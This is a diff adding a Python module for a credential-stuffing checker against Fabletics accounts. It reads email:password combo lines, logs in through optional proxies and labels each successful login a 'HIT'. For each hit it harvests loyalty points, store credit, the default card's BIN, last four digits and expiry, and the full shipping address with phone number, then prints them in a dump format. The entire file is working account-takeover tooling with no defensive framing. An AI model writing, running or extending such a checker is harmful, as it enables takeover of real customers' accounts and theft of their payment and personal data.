@@ -1,0 +1,197 @@
+from __future__ import annotations
+
+from dataclasses import dataclass, field
+from typing import Any
+
+import os
+
+from .client import FableticsAPIError, FableticsClient
+from .config import DEFAULT_PROXY
+from .proxy import parse_proxy
+
+
+@dataclass
+class CheckResult:
+    status: str
+    email: str
+    password: str
+    message: str = ""
+    data: dict[str, Any] = field(default_factory=dict)
+
+    def format_hit(self) -> str:
+        if self.status != "HIT":
+            return self.format_line()
+
+        cc = self.data.get("cc") or "N/A"
+        address = self.data.get("address") or "N/A"
+        store_credit = self.data.get("store_credit_balance", 0)
+        if float(store_credit).is_integer():
+            store_credit = int(store_credit)
+
+        return (
+            f"{self.email}:{self.password} | "
+            f"Points = {self.data.get('points', 0)} | "
+            f"Member_Credits = {self.data.get('member_credits', 0)} | "
+            f"storeCreditBalance = {store_credit} | "
+            f"CC = [{cc}] | "
+            f"Address = [{address}]"
+        )
+
+    def format_line(self) -> str:
+        if self.status == "HIT":
+            return self.format_hit()
+        return f"{self.status} | {self.email}:{self.password} | {self.message}"
+
+
+def _first(mapping: dict[str, Any], *keys: str, default: Any = None) -> Any:
+    for key in keys:
+        if key in mapping and mapping[key] not in (None, ""):
+            return mapping[key]
+    return default
+
+
+def _pick_default(items: list[dict[str, Any]]) -> dict[str, Any] | None:
+    if not items:
+        return None
+    for item in items:
+        if item.get("isDefault"):
+            return item
+    return items[0]
+
+
+def _format_card(card: dict[str, Any]) -> str:
+    card_type = str(card.get("cardType") or "CARD").upper()
+    cc_bin = str(card.get("ccBin") or "")
+    last_four = str(card.get("lastFourDigits") or "").zfill(4)
+    exp_month = str(card.get("expMonth") or "").zfill(2)
+    exp_year = str(card.get("expYear") or "")
+    if len(exp_year) == 4:
+        exp_year = exp_year[-2:]
+
+    masked = f"{cc_bin}{'•' * 6}{last_four}" if cc_bin else f"••••••••••{last_four}"
+    return f"{card_type} - {masked} exp: {exp_month}/{exp_year}"
+
+
+def _format_address(address: dict[str, Any]) -> str:
+    first = str(address.get("firstName") or "").strip()
+    last = str(address.get("lastName") or "").strip()
+    name = f"{first} {last}".strip()
+    address1 = str(address.get("address1") or "")
+    address2 = str(address.get("address2") or "")
+    country = str(address.get("countryCode") or "")
+    city = str(address.get("city") or "")
+    state = str(address.get("state") or "")
+    phone = str(address.get("phone") or "")
+    zip_code = str(address.get("zip") or "")
+    return f"{name}, {address1}, {address2}, {country}, {city}, {state}, {phone}, {zip_code}"
+
+
+def capture_account_data(client: FableticsClient, token: str, login_customer: dict[str, Any]) -> dict[str, Any]:
+    loyalty = client.get("/api/accounts/me/loyalty/details", token)
+    membership = client.get("/api/accounts/me/membership", token)
+    addresses = client.get("/api/accounts/me/addresses", token)
+
+    payments: list[dict[str, Any]] = []
+    try:
+        payments = client.get("/api/accounts/me/payments", token) or []
+    except FableticsAPIError:
+        pass
+
+    if not isinstance(addresses, list):
+        addresses = []
+    if not isinstance(payments, list):
+        payments = []
+
+    default_address = _pick_default(addresses)
+    shipping_id = membership.get("shippingAddressId")
+    if shipping_id:
+        for address in addresses:
+            if address.get("id") == shipping_id:
+                default_address = address
+                break
+
+    default_card = _pick_default(payments)
+    payment_object_id = membership.get("paymentObjectId")
+    if payment_object_id:
+        for card in payments:
+            if card.get("creditCardId") == payment_object_id:
+                default_card = card
+                break
+
+    points = int(loyalty.get("balance") or 0)
+    member_credits = int(membership.get("availableTokenQuantity") or 0)
+    store_credit_balance = float(membership.get("storeCreditBalance") or 0)
+
+    return {
+        "points": points,
+        "member_credits": member_credits,
+        "store_credit_balance": store_credit_balance,
+        "cc": _format_card(default_card) if default_card else "N/A",
+        "address": _format_address(default_address) if default_address else "N/A",
+        "email": _first(login_customer, "email"),
+        "customer_id": _first(login_customer, "id"),
+    }
+
+
+_UNSET = object()
+
+
+def resolve_proxy(proxy: str | None = None) -> str | None:
+    raw = proxy if proxy is not None else os.environ.get("FABLETICS_PROXY") or DEFAULT_PROXY
+    if not raw:
+        return None
+    return parse_proxy(raw)
+
+
+def check_account(
+    email: str,
+    password: str,
+    proxy: str | None | object = _UNSET,
+    timeout: int = 30,
+) -> CheckResult:
+    if proxy is _UNSET:
+        resolved_proxy = resolve_proxy()
+    else:
+        resolved_proxy = proxy
+    client = FableticsClient(proxy=resolved_proxy, timeout=timeout)
+
+    try:
+        login = client.login(email, password)
+        data = capture_account_data(client, login.access_token, login.customer)
+        return CheckResult(status="HIT", email=email, password=password, data=data)
+    except FableticsAPIError as exc:
+        if exc.retryable:
+            return CheckResult(
+                status="RETRY",
+                email=email,
+                password=password,
+                message=str(exc),
+            )
+
+        status_code = exc.status_code or 0
+        message = str(exc).lower()
+
+        if status_code == 403 and "authentication failed" in message:
+            return CheckResult(status="FAIL", email=email, password=password, message="Invalid credentials")
+        if status_code == 401:
+            return CheckResult(status="RETRY", email=email, password=password, message=str(exc))
+
+        return CheckResult(status="ERROR", email=email, password=password, message=str(exc))
+    except Exception as exc:
+        return CheckResult(status="ERROR", email=email, password=password, message=str(exc))
+
+
+def parse_combo(line: str) -> tuple[str, str] | None:
+    line = line.strip()
+    if not line or line.startswith("#"):
+        return None
+
+    if ":" not in line:
+        return None
+
+    email, password = line.split(":", 1)
+    email = email.strip()
+    password = password.strip()
+    if not email or not password:
+        return None
+    return email, password
